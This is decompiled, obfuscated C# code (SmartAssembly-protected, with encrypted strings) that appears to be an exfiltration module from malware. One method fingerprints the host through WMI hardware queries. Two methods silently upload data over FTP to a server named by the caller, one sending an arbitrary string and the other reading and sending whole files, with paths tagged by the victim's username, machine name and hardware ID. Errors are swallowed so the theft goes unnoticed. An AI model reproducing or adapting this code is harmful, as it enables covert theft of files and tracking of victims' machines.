using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

internal sealed class ktRHuThfCRwfl
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string RxhBfcTfwiicvu()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107369154));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107369133)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107369084);
		ManagementObject val3 = new ManagementObject(getString_0(107369079) + text2 + getString_0(107369070));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107369065)).ToString();
		return text3 + text;
	}

	public static void OcHSQymHShcZ(string RZSlrbBUfi = "URL", string IUSJQXKRyFUxmad = "USERNAME", string DrSkDfaHEADhsgB = "ACCESO", string sPrgTFaLGIUMlfpE = "")
	{
		try
		{
			string text = RxhBfcTfwiicvu();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RZSlrbBUfi + getString_0(107371910) + Environment.UserName + getString_0(107371865) + Environment.MachineName + getString_0(107371876) + text + getString_0(107371839));
			ftpWebRequest.Method = getString_0(107369040);
			ftpWebRequest.Credentials = new NetworkCredential(IUSJQXKRyFUxmad, DrSkDfaHEADhsgB);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(sPrgTFaLGIUMlfpE);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void csckszzbktVPAaRU(string LhPNzvqGlnDCLYHT = "URL", string fgSuwuSJDHGUBXv = "USERNAME", string JmnIpjAyyy = "ACCESO", string GlXaFPLgBBTKfyIN = "")
	{
		try
		{
			string text = RxhBfcTfwiicvu();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LhPNzvqGlnDCLYHT + getString_0(107371910) + Environment.UserName + getString_0(107371865) + Environment.MachineName + getString_0(107371876) + text + getString_0(107371876) + Path.GetFileName(GlXaFPLgBBTKfyIN));
			ftpWebRequest.Method = getString_0(107369040);
			ftpWebRequest.Credentials = new NetworkCredential(fgSuwuSJDHGUBXv, JmnIpjAyyy);
			byte[] array = File.ReadAllBytes(GlXaFPLgBBTKfyIN);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ktRHuThfCRwfl()
	{
		Strings.CreateGetStringDelegate(typeof(ktRHuThfCRwfl));
	}
}
